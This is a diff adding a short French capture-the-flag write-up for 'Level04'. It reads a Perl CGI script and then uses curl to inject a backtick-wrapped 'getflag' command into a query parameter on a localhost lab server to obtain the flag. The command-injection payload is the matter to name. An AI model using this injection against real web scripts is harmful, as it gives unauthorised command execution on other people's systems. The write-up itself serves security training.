@@ -1,0 +1,13 @@
+### Level04
+
+Pour commencer, nous consultons le contenu du fichier 'level04.pl' pour obtenir des informations en utilisant la commande suivante :
+
+	cat level04.pl
+
+Nous nous apercevons que c'est un script Perl.
+Ensuite, nous lançons la commande 'curl' pour accéder au script Perl CGI à l'adresse 'http://localhost:4747/level04.pl' tout en exécutant la commande shell 'getflag' :
+
+	curl 'http://localhost:4747/level04.pl?x=`getflag`'
+
+De cette manière, nous obtenons le drapeau recherché grâce à l'exécution de la commande shell 'getflag' à travers le script Perl.
+
